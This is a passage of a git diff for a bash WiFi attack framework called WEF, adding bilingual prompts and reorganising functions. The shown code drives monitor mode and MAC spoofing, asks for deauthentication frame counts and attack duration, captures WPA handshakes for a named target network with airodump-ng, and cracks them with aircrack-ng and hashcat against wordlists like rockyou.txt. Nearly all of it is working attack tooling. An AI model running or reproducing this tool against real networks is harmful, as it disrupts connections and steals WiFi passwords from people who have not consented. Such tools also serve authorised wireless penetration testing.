 }
 
-# Check the interface mode
-function check_interface_mode(){
-  # Function implemented by ultrazar
-  # Workaround for arch linux
-  if [ "$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')" == "Arch" ]; then
-    iwconfig ${netCard} 2>/dev/null | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/' 2>/dev/null
+
+
+
+#
+# Auxiliar functions to ask data to user (ESSID, BSSID, attack time, frames to send...)
+#
+
+# Ask for target ESSID
+function ask_essid(){
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Enter target AP name: " && read name
   else
-    iw dev ${netCard} info 2>/dev/null | grep 'type' | awk '{print $2}'
+    color_output_no_line "*" "Introduce el nombre del AP objetivo: " && read name
   fi
-}
 
-# Active Card
-function active_card(){
-  status_card=$(check_interface_mode)
-  # Check if the network adapter is in monitor mode or not
-  if [ "${status_card}" == "monitor" ]; then
-    good_output_ln "+" "Network card mode: ${greenC}\t\tMonitor"
-  else
-    good_output_ln "+" "Network card mode: ${grayC}\t\tManaged"
-  fi
-}
-
-# MAC Address Status Function
-function mac_status(){
-  # Function enters here if it's called at the start of the program
-  if [ "$time_counter" == "0" ]; then
-    # Check if network interface is active and exists
-    if [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ]; then
-      actual_mac=$(ifconfig | grep "$netCard" -A 3 | grep "ether" | awk '{print $2}')
-      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${grayC}\t\t${actual_mac}${endC}"
-    else
-      color_output "X" "MAC address not found\n"
-      ctrl_c
-    fi
-  # Function enters here if the function isn't called at the start of the program
-  elif [ "$start_counter" == "1" ]; then
-    if [ "$(check_interface_mode)" == "monitor" ]; then
-      actual_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}')
-      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${greenC}\t\t${actual_mac}${endC}"
-    else
-      echo -e ${netCard}
-      color_output "X" "MAC address not found\n"
-      ctrl_c
-    fi
-    # Function enters here if you haven't started the network adapter yet
-  elif [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ]; then
-    actual_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}')
-    echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${grayC}\t\t$actual_mac${endC}"
-    # Print an error if the network interface doesn't exists
-  else
-    echo -e "${blueC}[${rC}X${blueC}] MAC address not found${endC}\n"
-    ctrl_c
-  fi
-}
-
-# MAC Address Changer
-function mac_randomizer(){
-  # Turn off the interface
-  ifconfig ${netCard} down
-  # Randomize the mac address
-  macchanger -a ${netCard} &>/dev/null
-  good_output_ln "+" "MAC address randomized successfully"
-  # Activate again the interface
-  ifconfig ${netCard} up
-}
-
-# Network Card Status
-function card_status(){
-  if [ "${start_counter}" == "1" ] ; then
-    if [ -d "/sys/class/net/${netCard}" ]; then
-      echo -e "${blueC}[${greenC}+${blueC}] Network interface: ${greenC}\t\t${netCard}${endC}"
-    else
-      echo -e "${blueC}[${rC}X${blueC}] Network interface not found${endC}"
-    fi
-  else
-    if [ -d "/sys/class/net/${netCard}" ]; then
-      echo -e "${blueC}[${greenC}+${blueC}] Network interface: ${grayC}\t\t${netCard}${endC}"
-    else
-      echo -e "${blueC}[${rC}X${blueC}] Network interface not found${endC}"
-    fi
-  fi
-}
-
-# Network Card Start
-function card_setup(){
-  # Function enters here if you've used the "Active Card" option
-  if [ "$start_counter" != "1" ]; then
-    card_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
-    # Check if the value is the same as the interface to avoid errors in the else
-    if [ "${card_check}" == "${netCard}" ]; then
-      color_output_ln "*" "Configuring network card..."
-      kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)
-
-      if [ "${kill_network_services}" == "" ]; then
-        echo -ne "\n${blueC}[${yC}*${blueC}] Are you sure to execute \"airmon-ng check kill\"? This will stop your active network connections! [${endC}${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read kill_network_services
-        if [ "$kill_network_services" == "y" ]; then
-          echo "airmon_check_kill=true" >> /opt/wef/wef.cnf
-          kill_network_services="true"
-        else
-          echo "airmon_check_kill=false" >> /opt/wef/wef.cnf
-          kill_network_services="false"
-        fi
-				
-        echo -e "\n${blueC}[${yC}*${blueC}] airmon_check_kill set to ${kill_network_services}. You can change this later in /opt/wef/wef.cnf${endC}"; sleep 1.2;
-      fi
-
-      if [ "${kill_network_services}" == "true" ]; then
-        airmon-ng check kill &>/dev/null
-      fi
-
-      good_output "+" "Network card configured successfully"
-      # Enable monitor mode
-      airmon-ng start ${netCard} &>/dev/null
-      correct_counter="2"
-
-      # Workaround for some weird interfaces which change its name radically
-      if [ ! -d "/sys/class/net/${netCard}" ] && [ ! -d "/sys/class/net/${netCard}mon" ]; then
-        ask_new_name
-      # Check if your interface name changes when starting in monitor mode adding "mon" to its name  
-      elif [ "$(iwconfig ${netCard}mon | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=':')" == "Monitor" ]; then
-        evilCard="${netCard}"
-        netCard="${netCard}mon"
-        start_counter="1"
-      # Enter here if the name doesn't change when starting in monitor mode
-      elif [ "$(check_interface_mode)" == "monitor" ]; then
-        evilCard="${netCard}"
-        start_counter="1"
-      fi
-      sleep 1
-    fi
-  fi
-}
-
-# Network Card Stop
-function card_stop(){
-  airmon-ng stop ${netCard} &>/dev/null
-  ifconfig ${netCard} up &>/dev/null
-  good_output "+" "Monitor mode stoped\n"
-}
-
-# Ask for channel and ESSID
-function ask_data1(){
-  echo -ne "\n${blueC}[${yC}*${blueC}] Target AP name: ${endC}" && read name
-  echo -ne "${blueC}[${yC}*${blueC}] AP channel: ${endC}" && read channel
-}
-
-# Ask for channel
-function ask_data2(){
-  color_output_no_line "*" "Target AP name: " && read name
   if [ "${name}" == "exit" ] || [ "${name}" == "quit" ]; then
     ctrl_c
   fi
@@ -482,7 +487,12 @@ function ask_data2(){
 
 # Ask for target BSSID
 function ask_mac(){
-  color_output_no_line "*" "BSSID address of the AP: " && read ap_mac
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Enter MAC address of the AP (BSSID): " && read ap_mac
+  else
+    color_output_no_line "*" "Introduce la dirección MAC del AP (BSSID): " && read ap_mac
+  fi
+
   if [ "${ap_mac}" == "exit" ] || [ "${ap_mac}" == "quit" ]; then
     ctrl_c
   fi
@@ -490,7 +500,12 @@ function ask_mac(){
 
 # Ask for client MAC
 function ask_mac2(){
-  color_output_no_line "*" "Client MAC address: " && read client_mac
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Client MAC address: " && read client_mac
+  else
+    color_output_no_line "*" "Dirección MAC del cliente: " && read client_mac
+  fi
+
   if [ "${client_mac}" == "exit" ] || [ "${client_mac}" == "quit" ]; then
     ctrl_c
   fi
@@ -498,50 +513,644 @@ function ask_mac2(){
 
 # Ask for attack duration
 function ask_time(){
-  echo; color_output_no_line "*" "Attack duration (default=${default}): " && read attack_time
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Set attack duration (default=${default}): " && read attack_time
+  else
+    color_output_no_line "*" "Introduce la duración del ataque (por defecto=${default}): " && read attack_time
+  fi
+
   if [ "${attack_time}" == "exit" ] || [ "${attack_time}" == "quit" ]; then
+    ctrl_c
+  fi
+
+  if [ ! "${attack_time}" ]; then
+    attack_time="${default}"
+  fi
+
+  if [[ ${attack_time} =~ [^0-9ms] ]] && [ "${attack_time}" != "back" ]; then
+    if [ "$lang" == "en" ]; then
+      color_output "X" "Invalid attack duration!"
+    else
+      color_output "X" "Duración inválida!"
+    fi
+
+    ask_time
+  fi
+
+}
+
+# Ask amount of frames to send
+function ask_packets(){
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Amount of deauth frames to send (default=${default}): " && read packets_to_send
+  else
+    color_output_no_line "*" "Cantidad de paquetes de deautenticación a enviar (por defecto=${default}): " && read packets_to_send
+  fi
+
+  if [ ! "$packets_to_send" ]; then
+    packets_to_send="${default}"
+  fi
+
+  if [ "$packets_to_send" == "exit" ] || [ "$packets_to_send" == "quit" ]; then
     ctrl_c
   fi
 }
 
-function ask_new_name(){ # Ask user for new interface name if it has changed
-  echo -ne "\n${blueC}[${yC}*${blueC}] Interface name has changed, how is it called now?: ${endC}" && read new_name
-  
+# Ask the user if he/she wants to capture handshakes
+function ask_handshakes(){
+  if [ "$lang" == "en" ]; then
+    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture handshakes? (default=yes) [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read c_hand
+  else
+    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los handshakes? (por defecto=si) [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read c_hand
+  fi
+
+  if [ "$c_hand" == "exit" ] || [ "$c_hand" == "quit" ]; then
+    ctrl_c
+  fi
+
+  # Check user input to start airodump or not
+  if [ "$c_hand" == "y" ] || [ "$c_hand" == "yes" ] || [ "$c_hand" == "s" ] || [ "$c_hand" == "si" ] || [ ! "$c_hand" ]; then
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC}Don't close airodump-ng window, it will be closed automatically${endC}"
+    else
+      echo -e "${blueC}No cierres la ventana de airodump-ng, se cerrará automaticamente${endC}"
+    fi; sleep 0.2
+    c_h="true"
+    cap_date=$(date +"%Y-%m-%d-%H-%M-%S")
+    cap_name="${cap_date}-capture"
+
+    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${name}/${cap_name}\" --essid \"${name}\" ${netCard}" 2>/dev/null &
+    air_PID=$!
+  else
+    c_h="false"
+  fi
+}
+
+# Ask user for new interface name if it has changed when enabling monitor mode
+function ask_new_name(){
+  if [ "$lang" == "en" ]; then
+    echo -e "${blueC}In new interfaces nomenclature, names change after enabling monitor mode${endC}"
+    echo -ne "\n${blueC}[${yC}*${blueC}] Interface name has changed, how is it called now? (execute iwconfig to see its name): ${endC}" && read new_name
+  else
+    echo -e "${blueC}Con la nueva nomenclatura de las interfaces, los nombre cambian despues de activar el modo monitor${endC}"
+    echo -ne "\n${blueC}[${yC}*${blueC}] El nombre de la interfaz ha cambiado, ¿como se llama ahora? (ejecuta iwconfig para verlo): ${endC}" && read new_name
+  fi
+
   if [ ! -d "/sys/class/net/${new_name}" ]; then
-    color_output_ln "X" "Especified interface doesn't exist!"
+    if [ "$lang" == "en" ]; then
+      color_output_ln "X" "Especified interface doesn't exist!"
+    else
+      color_output_ln "X" "La interfaz especificada no existe!"
+    fi
     ask_new_name
   fi
 
   evilCard=${netCard}
   netCard=${new_name}
-  start_counter="1"
+  start_counter=1
 }
 
-function check_ap_list(){
-  if [ ! -f "scan_output" ]; then # Check if an AP scan already exists
-    color_output_ln "*" "Scanning networks...\n"
-    timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
-  else # If it exists read content
-    color_output_ln "*" "Acess points list:\n"
-    cat scan_output
+# Ask for AP BSSID if name is duplicated
+function ask_name_duplicate(){
+  cat /tmp/.scan_output | grep "${name}$"
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Multiple APs found with that name, enter its BSSID: " && read ap_bssid
+  else
+    color_output_no_line "*" "Múltiples APs encontrados con ese nombre, introduce su BSSID: " && read ap_bssid
+  fi
+
+  if [ "$ap_bssid" == "exit" ] || [ "$ap_bssid" == "quit" ]; then
+    ctrl_c
   fi
 }
 
-# AP Scan
-function ap_scan(){
-  echo; timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
-  sleep 0.2
-  good_output_ln "+" "Scan completed"
+function ask_to_crack_handshakes(){
+  if [ "${c_h}" == "true" ]; then
+    if [ "$(check_handshake)" -gt "0" ]; then
+      if [ "$lang" == "en" ]; then
+        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshakes? This process will take a long time [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+      else
+        echo -ne "\n${blueC}[${yC}*${blueC}] Quieres crackear los handshakes? Este proceso tardará bastante tiempo [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+      fi
+    fi
+  fi
 }
 
-# Wordlist Function
+
+
+
+#
+# Extra auxiliary functions
+#
+
+function report-gen(){
+  if [ ! -f "/opt/wef/main/logs/${name}.log" ]; then
+    touch "/opt/wef/main/logs/${name}.log" 2>/dev/null
+  fi
+
+  # No name
+  if [ ! "${name}" ]; then
+    if [ "$lang" == "en" ]; then
+      name="Not especified"
+    else
+      name="No especificado"
+    fi
+  fi
+
+  # No channel
+  if [ ! "${channel}" ]; then
+    if [ "$lang" == "en" ]; then
+      channel="Not especified"
+    else
+      channel="No especificado"
+    fi
+  fi
+
+  # Duration not especified
+  if [ ! "${attack_time}" ]; then
+    if [ "$lang" == "en" ]; then
+      attack_time="Not especified"
+    else
+      attack_time="No especificado"
+    fi
+  fi
+
+  # Log file format
+  if [ "$lang" == "en" ]; then
+    echo -e "[WEF] WiFi Exploitation Framework
+---------------------------------
+Attack date: ${actual_date}
+Attack type: ${type_of_attack}
+Target Access Point: ${name}
+Attack duration: ${attack_time}
+AP channel: ${channel}
+---------------------------------\n" >> "/opt/wef/main/logs/${name}.log" 2>/dev/null
+  else
+    echo -e "[WEF] WiFi Exploitation Framework
+---------------------------------
+Fecha del ataque: ${actual_date}
+Tipo de ataque: ${type_of_attack}
+Punto de acceso objetivo: ${name}
+Duración del ataque: ${attack_time}
+Canal del AP: ${channel}
+---------------------------------\n" >> "/opt/wef/main/logs/${name}.log" 2>/dev/null
+  fi
+}
+
+function parse_info(){
+  if [[ $(check_dups | wc -l) > 1 ]]; then
+    ask_name_duplicate
+    if [ "$ap_bssid" == "back" ]; then
+      return
+    fi
+
+    channel=$(cat /tmp/.scan_output | grep "${name}$" | grep "${ap_bssid}" | awk '{print $2}' | head -n 1)
+    ap_mac="${ap_bssid}"
+    actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+
+  else
+    channel=$(cat /tmp/.scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
+    ap_mac=$(cat /tmp/.scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
+    actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+  fi
+}
+
+function print_chipset(){
+  delim=$(airmon-ng | grep "${netCard}" | awk '{print $3}')
+  good_output "+" "Chipset:${grayC}\t\t\t$(airmon-ng | grep "${netCard}" | grep -oP "(?<=${delim}).*(?=802)" | sed 's/^[[:blank:]]*//')"
+}
+
+function check_vif(){
+  iw list | grep "Supported interface modes" -A 8 | grep "AP/VLAN"
+}
+
+# Check the interface mode
+function check_interface_mode(){
+  # Function implemented by ultrazar
+  # Workaround for arch linux
+  if [ "$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"' | grep "Arch")" == "Arch" ]; then
+    iwconfig ${netCard} 2>/dev/null | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/' 2>/dev/null
+  else
+    iw dev ${netCard} info 2>/dev/null | grep 'type' | awk '{print $2}'
+  fi
+}
+
+function check_monitor_type(){
+  # Check if monitor mode was enabled using airmon-ng or iwconfig
+  if [ "$(echo "${netCard}" | grep "mon")" ]; then
+    echo "airmon"
+  else
+    echo "iwconfig"
+  fi
+}
+
+function check_dups(){
+  cat /tmp/.scan_output | grep "${name}$"
+}
+
+function check_handshake(){
+  total_amount=$(aircrack-ng "/opt/wef/main/captures/${name}/${cap_name}-01.cap" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)')
+  if [ "$total_amount" == "" ]; then
+    echo "0"
+  else
+    echo "${total_amount}" | tr -d " "
+  fi
+}
+
+function check_handshakes_in_file(){
+  total_amount=$(aircrack-ng "${cap_name}" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)')
+  if [ "$total_amount" == "" ]; then
+    echo "0"
+  else
+    echo "${total_amount}" | tr -d " "
+  fi
+}
+
+function check_and_create(){
+  if [ ! -d "${1}" ]; then
+    mkdir "${1}" 2>/dev/null
+  fi
+}
+
+# https://stackoverflow.com/questions/42660218/bash-generate-random-mac-address-unicast
+function generate_rand_mac(){
+  hexdump -n 6 -ve '1/1 "%.2x "' /dev/random | awk -v a="2,6,a,e" -v r="$RANDOM" 'BEGIN{srand(r);}NR==1{split(a,b,",");r=int(rand()*4+1);printf "%s%s:%s:%s:%s:%s:%s\n",substr($1,0,1),b[r],$2,$3,$4,$5,$6}'
+}
+
+# Sets some important variables to "" (empty) to avoid errors and more
+function reset_info(){
+  channel=""
+  name=""
+  attack_time=""
+  packets_to_send=""
+  ap_mac=""
+  catch_handshakes=""
+  c_h=""
+  crack_option=""
+}
+
+
+
+#
+# Extra functions
+#
+
+function list_interfaces(){
+  interfaces_out=$(ifconfig | grep ": flags=" | awk '{print $1}' FS=":" | grep -v "lo")
+
+  color_output_ln "*" "Interfaces:"
+  while IFS= read -r line; do
+    echo -e "\t${grayC}${line}${endC}"
+  done <<< "${interfaces_out}"
+}
+
+# Dependencies Function
+function dependencies(){
+  # Programs array
+  programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm wget dnsmasq hostapd hostapd-wpe php lighttpd pixiewps)
+  system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
+  if [ "${system}"  == "Parrot" ] || [ "${system}"  == "Kali" ] || [ "${system}"  == "Ubuntu" ]; then
+    for program in "${programs[@]}"; do
+      which $program &>/dev/null
+      if [ "$(echo $?)" == "1" ]; then
+        if [ "$lang" == "en" ]; then
+          color_output "*" "Installing ${program}..."
+        else
+          color_output "*" "Instalando ${program}"
+        fi
+        apt install "${program}" -y &>/dev/null
+      fi
+    done
+
+  elif [ "${system}"  == "Arch" ] || [ "$(echo \"${system}\" | grep -i \"arch\")" ]; then
+    for program in "${programs[@]}"; do
+      which $program &>/dev/null
+      if [ "$(echo $?)" == "1" ]; then
+        if [ "$lang" == "en" ]; then
+          color_output "*" "Installing ${program}..."
+        else
+          color_output "*" "Instalando ${program}..."
+        fi
+        pacman -S "${program}" --noconfirm &>/dev/null
+      fi
+    done
+  fi
+}
+
+#
+# Functions related to network interface info (MAC, mode, frequencies...) and enabling/disabling monitor mode
+#
+
+# Check if interface is in managed or monitor mode
+function print_interface_mode(){
+  status_card=$(check_interface_mode)
+  # Check if the network adapter is in monitor mode or not
+  if [ "${status_card}" == "monitor" ]; then
+    if [ "$lang" == "en" ]; then
+      good_output_ln "+" "Interface mode: ${greenC}\t\tMonitor"
+    else
+      good_output_ln "+" "Modo de la interfaz: ${greenC}\tMonitor"
+    fi
+  else
+    if [ "$lang" == "en" ]; then
+      good_output_ln "+" "Interface mode: ${grayC}\t\tManaged"
+    else
+      good_output_ln "+" "Modo de la interfaz: ${grayC}\tManaged"
+    fi
+  fi
+}
+
+# Print interface name, use green color for monitor mode and gray for managed mode
+function print_interface_name(){
+  if [ -d "/sys/class/net/${netCard}" ]; then
+    if [ "$lang" == "en" ]; then
+      if [ "$(check_interface_mode)" == "monitor" ]; then
+        echo -e "${blueC}[${greenC}+${blueC}] Interface name: ${greenC}\t\t${netCard}${endC}"
+      else
+        echo -e "${blueC}[${greenC}+${blueC}] Interface name: ${grayC}\t\t${netCard}${endC}"
+      fi
+
+    else
+      if [ "$(check_interface_mode)" == "monitor" ]; then
+        echo -e "${blueC}[${greenC}+${blueC}] Nombre de la interfaz: ${greenC}\t${netCard}${endC}"
+      else
+        echo -e "${blueC}[${greenC}+${blueC}] Nombre de la interfaz: ${grayC}\t${netCard}${endC}"
+      fi
+    fi
+
+  else
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC}[${yC}X${blueC}] Interface not found${endC}"
+    else
+      echo -e "${blueC}[${yC}X${blueC}] Interfaz no encontrada${endC}"
+    fi
+  fi
+}
+
+# Print MAC address
+function print_mac_address(){
+  # Check if network interface is active and exists
+  if [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ] && [ "$(check_interface_mode)" != "monitor" ]; then
+    current_mac=$(ifconfig | grep "$netCard" -A 3 | grep "ether" | awk '{print $2}')
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${grayC}\t\t${current_mac}${endC}"
+    else
+      echo -e "${blueC}[${greenC}+${blueC}] Dirección MAC: ${grayC}\t\t${current_mac}${endC}"
+    fi
+  
+  # Function enters here if the function isn't called at the start of the program
+  elif [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ] && [ "$(check_interface_mode)" == "monitor" ]; then
+    current_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}')
+    if [ "$lang" == "en" ]; then
+      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${greenC}\t\t${current_mac}${endC}"
+    else
+      echo -e "${blueC}[${greenC}+${blueC}] Dirección MAC: ${greenC}\t\t${current_mac}${endC}"
+    fi
+
+  else
+    if [ "$lang" == "en" ]; then
+      color_output "X" "An error has ocurred while getting MAC address\n"
+    else
+      color_output "X" "Ha ocurrido un error al obtener la dirección MAC\n"
+    fi
+    ctrl_c
+  fi 
+}
+
+# Print interface frequencies band (2.4Ghz, 5Ghz or both)
+function print_freq_band(){
+  out=$(iwlist ${netCard} freq)
+  if [ "$lang" == "en" ]; then
+    if [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -le "14" ]; then
+      good_output "+" "Frequencies:\t\t${grayC}2.4Ghz"
+    elif [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -ge "32" ]; then
+      good_output "+" "Frequencies:\t\t${grayC}2.4Ghz and 5Ghz"
+    else
+      good_output "+" "Frequencies:\t\t${grayC}5.Ghz"
+    fi
+
+  else
+    if [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -le "14" ]; then
+      good_output "+" "Frecuencias:\t\t${grayC}2.4Ghz"
+    elif [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -ge "32" ]; then
+      good_output "+" "Frecuencias:\t\t${grayC}2.4Ghz y 5Ghz"
+    else
+      good_output "+" "Frecuencias:\t\t${grayC}5.Ghz"
+    fi
+  fi
+}
+
+# Enable monitor mode
+function enable_mon(){
+  # Function enters here if you've enabled monitor mode
+  #if [[ $start_counter != 1 ]]; then
+  if [ "$(check_interface_mode)" != "monitor" ]; then
+    card_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
+    # Check if the value is the same as the interface to avoid errors in the "else"
+    if [ "${card_check}" == "${netCard}" ]; then
+      
+      if [ "$lang" == "en" ]; then
+        color_output_ln "*" "Configuring network card interface..."
+      else
+        color_output_ln "*" "Configurando la interfaz de la tarjeta de red..."
+      fi
+
+      kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)
+
+      if [ "${kill_network_services}" == "" ]; then
+        if [ "$lang" == "en" ]; then
+          echo -ne "${blueC}[${yC}*${blueC}] Are you sure to execute \"airmon-ng check kill\"? This will stop your active network connections! [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read k_n_s
+        else
+          echo -ne "${blueC}[${yC}*${blueC}] Seguro que quieres ejecutar \"airmon-ng check kill\"? Esto cortará tus conexiones activas! [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read k_n_s
+        fi
+        if [ "$k_n_s" == "y" ] || [ "$k_n_s" == "yes" ] || [ "$k_n_s" == "s" ] || [ "$k_n_s" == "si" ]; then
+          echo "airmon_check_kill=true" >> /opt/wef/wef.cnf
+          k_n_s="true"
+        else
+          echo "airmon_check_kill=false" >> /opt/wef/wef.cnf
+          k_n_s="false"
+        fi
+				
+        if [ "$lang" == "en" ]; then
+          echo -e "${blueC}[${yC}*${blueC}] airmon_check_kill set to ${k_n_s}. You can change this later in /opt/wef/wef.cnf${endC}"
+        else
+          echo -e "${blueC}[${yC}*${blueC}] El valor de airmon_check_kill es ${k_n_s}. Puedes cambiar esto mas tarde en el archivo /opt/wef/wef.cnf${endC}"
+        fi
+      fi
+
+      if [ "${k_n_s}" == "true" ]; then
+        airmon-ng check kill &>/dev/null
+      fi
+
+      if [ "$lang" == "en" ]; then
+        good_output "+" "Interface configured successfully"
+      else
+        good_output "+" "Interfaz configurada correctamente"
+      fi
+
+      # Enable monitor mode
+      airmon-ng start ${netCard} &>/dev/null
+
+      # Workaround for some weird interfaces which change its name radically after enabling monitor mode
+      if [ ! -d "/sys/class/net/${netCard}" ] && [ ! -d "/sys/class/net/${netCard}mon" ]; then
+        ask_new_name
+
+      # Check if your interface name changes when starting in monitor mode by adding "mon" to its name  
+      elif [ "$(iwconfig ${netCard}mon | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=':')" == "Monitor" ]; then
+        if [ "$lang" == "en" ]; then
+          press_enter "Interface name has changed to ${netCard}mon, press Enter to continue "
+        else
+          press_enter "El nombre de la interfaz ha cambiado a ${netCard}mon, presiona Enter para continuar "
+        fi
+        oldCard="${netCard}"
+        evilCard="${netCard}"
+        netCard="${netCard}mon"
+        start_counter=1
+        export netCard oldCard evilCard
+
+      # Enter here if the name doesn't change when starting in monitor mode
+      elif [ "$(check_interface_mode)" == "monitor" ]; then
+        oldCard="${netCard}"
+        evilCard="${netCard}"
+        start_counter=1
+        export netCard oldCard evilCard
+      fi
+    fi
+  fi
+}
+
+# Disable monitor mode and enable managed mode
+function disable_mon(){
+  if [ "$lang" == "en" ]; then
+    color_output_ln "*" "Configuring interface..."
+  else
+    color_output_ln "*" "Configurando interfaz..."
+  fi
+  airmon-ng stop ${netCard} &>/dev/null
+  ifconfig ${oldCard} up &>/dev/null
+  netCard=${oldCard}
+
+  if [ "$lang" == "en" ]; then
+    good_output "+" "Monitor mode disabled"
+  else
+    good_output "+" "Modo monitor desactivado"
+  fi
+  start_counter=0
+}
+
+# Change MAC address
+function mac_randomizer(){
+  # Turn off the interface
+  ifconfig ${netCard} down
+
+  echo
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "MAC address to replace the current one with (default=random): " && read mac_to_change
+  else
+    color_output_no_line "*" "Dirección MAC con la que remplazar la actual (por defecto=random): " && read mac_to_change
+  fi
+
+  if [ ! "${mac_to_change}" ]; then
+    # Randomize the mac address
+    macchanger -a ${netCard} &>/dev/null
+  else
+    macchanger -m ${mac_to_change} ${netCard} &>/dev/null
+  fi
+
+  if [ "$lang" == "en" ]; then
+    good_output "+" "MAC address changed successfully"
+  else
+    good_output "+" "Dirección MAC cambiada correctamente"
+  fi
+
+  # Activate again the interface
+  ifconfig ${netCard} up
+}
+
+
+
+
+#
+# Handshake related functions
+#
+
+# Start WPA handshake cracking process with aircrack-ng
+function handshake_crack(){
+  if [ -f "/opt/wef/main/captures/${name}/${cap_name}-01.cap" ]; then
+    trap keep_exit_c INT
+    ask_dict
+    aircrack-ng -w ${wordlist_to_use} "/opt/wef/main/captures/${name}/${cap_name}-01.cap" | tee # "tee" to stop the command with Ctrl + C
+
+    if [ "$lang" == "en" ]; then
+      good_output "+" "Cracking process completed"
+    else
+      good_output "+" "Proceso de cracking completado"
+    fi
+
+    reset_info
+    keep_exit
+  else
+    if [ "$lang" == "en" ]; then
+      color_output_ln "X" "Handshakes file not found\n"
+    else
+      color_output_ln "X" "Archivo de handshakes no encontrado\n"
+    fi
+    sleep 1
+  fi
+}
+
+# Start PMKID handshake cracking process with hashcat
+function pmkid_crack(){
+  file_to_crack="/opt/wef/main/captures/${name}/pmkid_hashes"
+
+  if [ -f "${file_to_crack}" ] && [ "$(wc -l "${file_to_crack}" | awk '{print $1}')" != "0" ]; then
+    trap keep_exit_c INT
+    ask_dict
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "Press Ctrl + C to stop hashcat"
+    else
+      color_output_ln "*" "Presiona Ctrl + C para parar hashcat"
+    fi; sleep 1.5
+
+    hashcat -m 22000 "${file_to_crack}" "${wordlist_to_use}" -d 1
+    if [ "$lang" == "en" ]; then
+      good_output_ln "+" "Cracking process completed"
+    else
+      good_output_ln "+" "Proceso de cracking completado"
+    fi
+
+    reset_info
+    keep_exit
+
+  else
+    if [ "$lang" == "en" ]; then
+      color_output_ln "*" "No PMKID handshakes captured"
+    else
+      color_output_ln "*" "No se han capturado handshakes PMKID"
+    fi
+    reset_info
+    keep_exit
+  fi
+}
+
+
+# Ask the user to select a wordlist
 function ask_dict(){
-  color_output_ln "+" "Wordlists availables:"
-  echo -e "${blueC}If you want to use a custom dictionary enter its name or path${endC}\n"
-  echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
-  echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
-  echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
-  color_output_no_line "WEF" "Select a wordlist to use: " && read dic_option
+  if [ "$lang" == "en" ]; then
+    color_output_ln "+" "Wordlists availables:"
+    echo -e "${blueC}If you want to use a custom dictionary enter its path${endC}\n"
+    echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
+    echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
+    echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
+    color_output_no_line "*" "Select a wordlist to use: " && read dic_option
+  else
+    color_output_ln "+" "Diccionarios disponibles:"
+    echo -e "${blueC}Si quieres usar un diccionario personalizado escribe su ruta completa${endC}\n"
